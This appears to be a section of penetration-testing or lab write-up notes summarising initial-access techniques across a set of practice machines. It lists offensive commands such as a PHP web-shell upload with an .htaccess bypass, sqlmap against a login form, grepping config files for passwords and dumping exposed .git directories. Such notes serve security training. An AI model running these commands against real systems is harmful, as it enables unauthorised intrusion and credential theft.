## 🔓 Initial Access (Machines 121–130)

### Techniques Observed

```bash
# File Upload Bypass
curl -F "file=@shell.php" http://<IP>/upload
mv shell.php shell.jpg; echo "AddType application/x-httpd-php .jpg" > .htaccess

# Credential Reuse
ssh user@<IP> -p 22

# Config File Disclosure
curl http://<IP>/config.php | grep password

# Common CMS Exploits
wpscan --url http://<IP> --enumerate vp

# SQLi Authentication Bypass
sqlmap -u "http://<IP>/login.php" --data "user=admin&pass=pass" --dbs

# Exposed .git Directory
git-dumper http://<IP>/.git/ /tmp/dump

# Base64 Credential Recovery
echo '<base64-string>' | base64 -d

# Exploiting CVEs (example)
searchsploit "CMS version"
```

### Summary of Entry Points

- Multiple file upload functions vulnerable to bypass
- SQL injection used for login bypass
- Default creds (admin/admin) on internal panels
- Exposed backups and Git repositories retrieved sensitive data
- Config files disclosed credentials
- CMS plugins and versions had known RCE vectors